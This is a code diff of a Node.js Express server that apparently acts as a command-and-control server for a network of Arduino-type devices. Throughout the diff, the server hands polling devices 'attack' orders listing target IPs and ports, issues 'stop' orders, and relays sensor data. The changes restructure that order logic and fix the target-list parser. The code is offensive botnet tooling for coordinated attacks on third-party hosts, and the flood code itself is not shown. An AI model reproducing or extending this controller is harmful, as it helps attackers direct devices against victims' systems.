@@ -60,30 +60,12 @@ app.post("/", function(req, res){
     knownIds[id] = {time:1000, sent:false, stop:false};
     //console.log(knownIds);
   } 
-  else
+  else  //Known host
   {
-      if(!attack) 
-      {
-          if(stop)
-          {
-            if(knownIds[id].stop == false)
-            {
-              res.end("stop");
-              knownIds[id].stop = true;
-              knownIds[id].sent = false;
-            }
-            else
-            {
-              console.log("OK");
-              res.end("ok"); 
-            }
-          }
-      } 
-      else //Known host 
-      {
-            //attack order not sent yet
-            if(knownIds[id].sent == false)
-            {
+      if(attack)  //Attack order has been sent from the client
+      { 
+          if(!knownIds[id].sent)  //Attack order hasn't been sent yet to the 
+          {                       //attacker
               var content = {};
               content.arduinos = ipPortPair;
               content.targets = targetJson;
@@ -92,16 +74,38 @@ app.post("/", function(req, res){
               res.setHeader('Content-Type', 'application/json');
               res.send(JSON.stringify(content));
               knownIds[id].sent = true;
-            }
-            else
-            {
+              knownIds[id].stop = false;
+          }
+          else
+          {
+              console.log("OK");
               res.end("ok");
-            }
+          }
       }
-    
+      else //We're not attacking
+      {
+          if(stop) //Stop order has been sent from the client
+          {
+              if(!knownIds[id].stop) //stop hasn't been sent to the attacker yet
+              {
+                  res.end("stop");
+                  knownIds[id].stop = true;
+                  knownIds[id].sent = false;
+              }
+              else
+              {
+                  console.log("OK");
+                  res.end("ok");
+              }
+          }
+          else  //Not attacking, not stopping, just acknowledge 
+          {
+              console.log("OK");
+              res.end("ok");
+          }
+      }
   }
   
-
   var date = new Date();
   var ms = date.getMilliseconds();
   req.body.datetime = req.body.datetime + '.' + ms;
@@ -110,13 +114,16 @@ app.post("/", function(req, res){
   var data = "";
   data += "ID = " + "\"" + id + "\"\n";
   data += "["
-  if(sensorData.sensor0){
-  data += sensorJSON(datetime, sensorData.sensor0, "sensor0");
-  data += ",\n";
+
+  if(sensorData.sensor0)
+  {
+      data += sensorJSON(datetime, sensorData.sensor0, "sensor0");
+      data += ",\n";
   }
-  if(sensorData.sensor1){
-  data += sensorJSON(datetime, sensorData.sensor1, "sensor1");
-  data += " -]";
+  if(sensorData.sensor1)
+  {
+      data += sensorJSON(datetime, sensorData.sensor1, "sensor1");
+      data += " -]";
   }
 
   io.emit('iot data', data, req.body);
@@ -128,69 +135,51 @@ function parseTarget(targets) {
     var ips = [];
     var ports = [];
     var targetJson = {};
-
-
     var ip, port;
 
     var ipPortPair, res;
-    if(targets.indexOf(",") != -1) {
-    //more than one IP:port
-    ipPortPair = targets.substring(0, targets.indexOf(","));
-    res = targets.substring(targets.indexOf(",")+1);
-    } else {
-      ipPortPair = targets;
-      res = "";
+
+    if(targets.indexOf(",") != -1) 
+    {
+        //more than one IP:port
+        ipPortPair = targets.substring(0, targets.indexOf(","));
+        res = targets.substring(targets.indexOf(",")+1);
+    } 
+    else 
+    {
+        ipPortPair = targets;
+        res = "";
     }
 
     var finished = false;
 
     while(!finished)
     {
-      ip = ipPortPair.substring(0, ipPortPair.indexOf(":"));
-      port = ipPortPair.substring(ipPortPair.indexOf(":") + 1)
+        ip = ipPortPair.substring(0, ipPortPair.indexOf(":"));
+        port = ipPortPair.substring(ipPortPair.indexOf(":") + 1)
 
-      ips.push(ip);
-      ports.push(port);
+        ips.push(ip);
+        ports.push(port);
 
-      if(res.indexOf(",") != -1) {
-        ipPortPair = res.substring(0, res.indexOf(","));
-      } else {
-        //last element
-      /*ipPortPair = res;
-      ip = ipPortPair.substring(0, ipPortPair.indexOf(":"));
-      port = ipPortPair.substring(ipPortPair.indexOf(":") + 1)
+        if(res.indexOf(",") != -1) 
+        {
+            ipPortPair = res.substring(0, res.indexOf(","));
+        } 
+        else 
+        {
+            //last element
+            ip = res.substring(0, res.indexOf(":"));
+            port = res.substring(res.indexOf(":") + 1);
+            ips.push(ip);
+            ports.push(port);
+            finished = true;
+        }
 
-      ips.push(ip);
-      ports.push(port);
-      finished = true;*/
-      ip = res.substring(0, res.indexOf(":"));
-      port = res.substring(0, res.indexOf(":") + 1);
-      finished = true;
+        res = res.substring(res.indexOf(",")+1);
     }
-
-    res = res.substring(res.indexOf(",")+1);
-    //console.log("ipP " + ipPortPair);
-    //console.log("res " + res);
-    }
-
-    //console.log("ip");
-    //console.log(ips);
-    //console.log("port");
-    //console.log(ports);
 
     targetJson.ips = ips;
     targetJson.ports = ports;
-/*
-   {
-    targets: {
-      ips:[ip1,ip2,ip3,]
-      ports:[,,,]
-    }
-    arduinos: [{ip:algo, port:alguitomas},...] 
-    }
-  
-    }
-*/
     return targetJson;
 }
 
